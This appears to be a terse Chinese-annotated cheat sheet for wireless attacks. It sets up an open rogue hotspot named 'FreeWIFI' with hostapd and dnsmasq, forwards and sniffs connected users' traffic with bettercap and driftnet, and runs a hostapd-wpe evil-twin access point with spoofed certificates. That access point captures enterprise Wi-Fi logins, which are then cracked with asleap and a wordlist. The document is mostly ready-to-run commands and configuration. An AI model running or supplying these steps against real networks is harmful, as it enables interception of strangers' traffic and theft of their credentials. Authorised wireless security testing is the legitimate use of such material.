  #### Hostapd
	>apt install hostapd dnsmasq
	>cd /etc/hostapd
	>vim open.conf 创建无加密热点
	Interface=wlan1
	Ssid=FreeWIFI
	Driver=nl80211
	Channel=1
	Hw_mode=g
	
	>vim /etc/dnsmasq.conf
	Dhcp-range=10.0.0.1, 10.0.0.255,12h
	Interface=wlan1
	
	>systemctl restart dnsmasq
	消除网卡限制
	>nmcli radio wifi off
	>rfkill unblock wlan
	>ifconfig wlan1 10.0.0.1/24
	>hostapd open.conf
	嗅探
	>sysctl –w net.ipv4.ip_forward=1
	>iptables –t nat –A POSTROUTING –o 网卡 –j MASQUERADE
	>bettercap –iface wlan1
	>net.show
	>net.sniff on
	>driftnet –i wlan1
  #### Hostapd-wpe
	>apt install hostapd-wpe
	>vim /etc/hostapd-wpe/hostapd-wpe.conf
	配置interface=wlan1
	Ssid=
	Channel=
	证书修改
	>cd /etc/hostapd-wpe/certs/
	文件ca.cnf server.cnf client.cnf
	修改countrName stateOrProvinceName localityName …….
	>rm –rf *.pem *.der *.csr *.crt *.key *.p12 serial* index.txt*
	>make clean
	>./bootstrap
	>make install
	执行创建热点
	>hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
	获取到密码时使用asleep破解
	>asleap –C Challenge值 –R response值 –W 字典文件